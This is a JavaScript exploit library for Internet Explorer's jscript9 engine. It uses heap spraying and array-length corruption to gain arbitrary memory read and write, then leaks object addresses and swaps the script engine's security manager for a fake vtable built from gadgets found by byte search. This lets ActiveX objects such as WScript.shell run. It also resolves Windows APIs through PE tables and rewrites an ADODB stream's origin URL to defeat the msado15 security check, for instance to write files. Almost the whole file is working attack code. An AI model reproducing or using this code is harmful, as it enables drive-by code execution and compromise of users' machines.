

ExpLib = (function() {

	function ExpLib( num_arrays, arr_size, base, payload ) {
		this.arr1 = null;
		this.arr2 = null;
		this.base = base;
		this.arr_size = arr_size;
		this.arr_arr = null;
		// Allows to control the contents of the sprayed memory.
		// Have into account some array positions will be corrupted
		// while leaking and modifying things.
		this.arr_contents = [];

		this.payload = payload;
		this.modules = {}
		this.getproc = null;
		this.loadlibrary = null;

		// Offset to the Origin URL in the Stream, modifying it
		// allows to bypass msado15.SecurityCheck(), allowing
		// for example to write stream contents to filesystem.
		this.stream_origin = 0x44;
	}

	ExpLib.prototype.resolveAPI = function( modulename, procname ) {
		var module  = this.resolveModule( modulename );

		return this.callAPI( this.getproc, module, this.allocateString(procname) );
	}

	ExpLib.prototype.resolveModule = function( modulename ) {
		if ( this.modules[modulename] )
			return this.modules[modulename];

		var module = this.callAPI( this.loadlibrary, this.allocateString(modulename) );
		this.modules[modulename] = module;
		return module;
	}

	ExpLib.prototype.spray = function() {
		this.arr_arr = new Array( num_arrays );

		var decl = "[";

		for ( var i = 0; i < this.arr_size - 1; ++ i ) {
			decl += '0,';
		}

		decl += '0';
		decl += ']';

		for ( var i = 0; i < num_arrays; ++ i ) {
			this.arr_arr[i] = eval(decl);
			for(var j = 0; j < this.arr_contents.length; j++) {
				this.arr_arr[i][j] = this.arr_contents[j];
			}
		}

  }

	// Should be used before calling spray()
	ExpLib.prototype.setArrContents = function(contents) {
		for(var i = 0; i < this.arr_size && i < contents.length; i++) {
			this.arr_contents[i] = contents[i];
		}
	}

  ExpLib.prototype.setValue = function(i1, i2, v) {
		this.arr_arr[i1][i2] = v;
	}


  ExpLib.prototype.setValueByAddr = function(index, addr, v) {
		this.arr_arr[index][((addr % 0x1000) - 0x20) / 4] = v;
	}

	ExpLib.prototype.read32 = function(addr) {
		if ( addr % 4 ) {
			// error
		}

		if ( addr >= this.arr2_member_base ) {
			return this.arr2[(addr - this.arr2_member_base)/4];
		} else {
			return this.arr2[0x40000000 - (this.arr2_member_base - addr)/4]
		}
	}

	ExpLib.prototype.write32 = function(addr, value) {
		if ( addr % 4 ) {
			// error
		}

		if ( value >= 0x80000000 )
			value = -(0x100000000 - value);

		//alert(((addr - this.arr2_member_base)/4).toString(16));
		if ( addr >= this.arr2_member_base ) {
			this.arr2[(addr - this.arr2_member_base)/4] = value;
		} else {
			this.arr2[0x40000000 - (this.arr2_member_base - addr) / 4] = value;
		}
	}

	ExpLib.prototype.read8 = function(addr) {
		var value = this.read32( addr  & 0xfffffffc );
		switch ( addr % 4 ) {
			case 0: return (value & 0xff);
			case 1: return ((value >> 8) & 0xff);
			case 2: return ((value >> 16) & 0xff);
			case 3: return ((value >> 24) & 0xff);
		}

		return 0;
	}

	ExpLib.prototype.write8 = function(addr, value) {
		var original_value = this.read32( addr  & 0xfffffffc );
		var new_value;

		switch ( addr % 4 ) {
			case 0:
				new_value = (original_value & 0xffffff00) | (value & 0xff);
				break;

			case 1:
				new_value = (original_value & 0xffff00ff) | ((value & 0xff) << 8);
				break;
			case 2:
				new_value = (original_value & 0xff00ffff) | ((value & 0xff) << 16);
				break;
			case 3:
				new_value = (original_value & 0x00ffffff) | ((value & 0xff) << 24);
				break;
		}


		this.write32( addr  & 0xfffffffc, new_value );
	}


	ExpLib.prototype.writeBytes = function(addr, bytes) {
		for ( var i = 0; i + 3 < bytes.length; i += 4 ) {
			var value = (bytes[i] & 0xff) | ((bytes[i+1] & 0xff) << 8) |
						((bytes[i + 2] & 0xff) << 16) | ((bytes[i + 3] & 0xff) << 24);

			this.write32( addr + i, value );
		}

		for ( ; i < bytes.length; ++ i ) {
			this.write8( addr + i, bytes[i] );
		}
	}

	ExpLib.prototype.writeString = function(addr, s) {
		var bytes = [];
		var i = 0;
		for ( ; i < s.length; ++ i ) {
			bytes[i] = s.charCodeAt(i);
		}

		bytes[i] = 0;

		this.writeBytes( addr, bytes );
	}

	ExpLib.prototype.writeStringW = function(addr, s) {
		var bytes = [];
		var i = 0;
		for ( ; i < s.length; ++i ) {
			bytes[i * 2] = s.charCodeAt(i);
			bytes[i * 2 + 1] = 0;
		}

		bytes[s.length * 2] = 0;
		bytes[s.length * 2 + 1] = 0;

		this.writeBytes( addr, bytes );
	}

	ExpLib.prototype.read16 = function(addr) {
		if ( addr % 2 ) {
					// error, not aligned
		}

		var value = this.read32( addr  & 0xfffffffc );
		switch ( addr % 4 ) {
			case 0: return (value & 0xffff);
			case 1: return ((value >> 8) & 0xffff);
			case 2: return ((value >> 16) & 0xffff);
			case 3: /*not supported*/ break;
		}

		return 0;
	}

	ExpLib.prototype.strequal = function(addr, s)  {
		for ( var i = 0; i < s.length; ++ i ) {
			if ( this.read8(addr + i) != s.charCodeAt(i) )
				return false;
		}

		return true;
	}


	ExpLib.prototype.getModuleBase = function(addr) {

		var cur_addr = addr;

		while ( cur_addr > 0 ) {

			if ( (this.read32(cur_addr) & 0xffff) == 0x5a4d ) {
				return cur_addr;
			}

			cur_addr -= 0x10000;
		}

		return 0;
	}



	ExpLib.prototype.getModuleBaseFromIAT = function(base, name) {
		var import_table = base + this.read32( base + this.read32(base + 0x3c) + 0x80 );
		var cur_table = import_table;

		while ( cur_table < import_table + 0x1000 ) {

			var name_addr = base + this.read32(cur_table + 12);
			if ( this.strequal( name_addr, name ) ) {
				var iat = base + this.read32(cur_table + 16);
				var func = this.read32(iat);
				while ( 0 == func ) {
					iat += 4;
					func = this.read32(iat);
				}

				return this.getModuleBase( func & 0xFFFF0000 );

			}

			cur_table += 20;
		}

		return 0;
	}

	ExpLib.prototype.getProcAddress = function(base, procname)  {
		var export_table = base + this.read32( base + this.read32(base + 0x3c) + 0x78 );
		var num_functions = this.read32( export_table + 20 );
		var addr_functions = base + this.read32( export_table + 28 );
		var addr_names = base + this.read32( export_table + 32 );
		var addr_ordinals = base + this.read32( export_table + 36 );

		for ( var i = 0; i < num_functions; ++ i ) {
			var name_addr = this.read32( addr_names + i * 4 ) + base;
			if ( this.strequal( name_addr, procname ) ) {
				var ordinal = this.read16( addr_ordinals + i * 2 );
				var result = this.read32( addr_functions + ordinal * 4 ) + base;
				return result;
			}
		}

		return 0;
	}

	ExpLib.prototype.searchBytes = function(pattern, start, end)  {

		if ( start >= end || start + pattern.length > end )
			return 0;

		var pos = start;
		while ( pos < end ) {
			for ( var i = 0; i < pattern.length; ++ i ) {
				if ( this.read8(pos + i) != pattern[i] )
					break;
			}

			if ( i == pattern.length ) {
				return pos;
			}

			++ pos;
		}

		return 0;
	}


	ExpLib.prototype.getError = function(msg) {
		return this.err_msg;
	}

	ExpLib.prototype.setError = function(msg) {
		this.err_msg = msg;
	}

	ExpLib.prototype.setStreamOrigin = function(offset) {
		this.stream_origin = offset;
	}

	ExpLib.prototype.getStreamOrigin = function() {
		return this.stream_origin;
	}

	ExpLib.prototype.memcpy = function(dst, src, size) {
		var i = 0;
		for ( ; i < size - 4; i += 4 ) {
			this.write32( dst + i, this.read32(src + i) );
		}

		for ( ; i < size; ++ i ) {
			this.write8( dst + i, this.read8(src + i) );
		}
	}

	ExpLib.prototype.go = function() {

		var i = 0;



		for ( ; i < this.arr_arr.length - 1; ++ i ) {
			this.arr_arr[i][this.arr_size + 0x1c / 4] = 0;

			if ( this.arr_arr[i][this.arr_size + 0x18 / 4] == this.arr_size ) {
				this.arr_arr[i][this.arr_size + 0x14 / 4] = 0x3fffffff;
				this.arr_arr[i][this.arr_size + 0x18 / 4] = 0x3fffffff;

				this.arr_arr[i + 1].length = 0x3fffffff;

				if ( this.arr_arr[i+1].length == 0x3fffffff ) {
					break;
				}
			}

		}

		if ( i >= this.arr_arr.length - 1 ) {
			this.setError( "Cannot find array with corrupt length!" );
			return false;
		}

		this.arr1_idx = i;
		this.arr2_idx = i + 1;

		this.arr1 = this.arr_arr[i];
		this.arr2 = this.arr_arr[i + 1];

		this.arr2_base = this.base + 0x1000;
		this.arr2_member_base = this.arr2_base + 0x20;

		var func_addr = this.leakAddress(ActiveXObject);
		var script_engine_addr = this.read32(this.read32(func_addr + 0x1c) + 4);

		//alert(script_engine_addr.toString(16));

		var original_securitymanager = this.read32( script_engine_addr + 0x21c );
		if ( !original_securitymanager ) {
			// let security manager to be valid
			try {
				var WshShell = new ActiveXObject("WScript.shell");
			} catch (e) {}

			original_securitymanager = this.read32( script_engine_addr + 0x21c );
		}

		var original_securitymanager_vtable = this.read32(original_securitymanager);
		var securitymanager_size = 0x28;
		var fake_securitymanager = 0x1a1b2010;
		var fake_securitymanager_vtable = fake_securitymanager + 0x28;
		//alert(original_securitymanager.toString(16));

		this.memcpy( fake_securitymanager, original_securitymanager, securitymanager_size );
		this.memcpy( fake_securitymanager_vtable, original_securitymanager_vtable, 0x70 );
		this.write32( fake_securitymanager, fake_securitymanager_vtable );
		this.write32(script_engine_addr + 0x21c, fake_securitymanager);

		var jscript9_base = this.getModuleBase( this.read32(script_engine_addr) & 0xffff0000 );
		var jscript9_code_start = jscript9_base + this.read32(jscript9_base + this.read32(jscript9_base + 0x3c) + 0x104);
		var jscript9_code_end = jscript9_base + this.read32(jscript9_base + this.read32(jscript9_base + 0x3c) + 0x108);


		this.write32( fake_securitymanager_vtable + 0x14,
					 this.searchBytes( [0x8b, 0xe5, 0x5d, 0xc2, 0x08], jscript9_code_start, jscript9_code_end ) ); /* mov esp, ebp; pop ebp; ret 8; */

		this.write32( fake_securitymanager_vtable + 0x10,
					 this.searchBytes( [0x8b, 0xe5, 0x5d, 0xc2, 0x04], jscript9_code_start, jscript9_code_end ) ); /* mov esp, ebp; pop ebp; ret 4; */

		this.payload.execute(this);


		/*
		* restore
		*/

		this.write32( script_engine_addr + 0x21c, original_securitymanager );

		return true;

	}

	ExpLib.prototype.leakAddress = function(obj) {
		this.arr_arr[this.arr2_idx + 1][2] = obj;
		return this.read32(this.arr2_member_base + 0x1008);
	}

	ExpLib.prototype.switchStreamOrigin = function(stream) {
		var obj = this.leakAddress(stream);
		var stream_obj = this.read32(obj + 0x30);
		//var url_addr = this.read32(stream_obj + 0x3c);
		var url_addr = this.read32(stream_obj + this.stream_origin);

		/*
		* bypass domain check
		*/
		this.writeStringW( url_addr, 'file:///C:/1.htm' );
	}

	return ExpLib;

})();
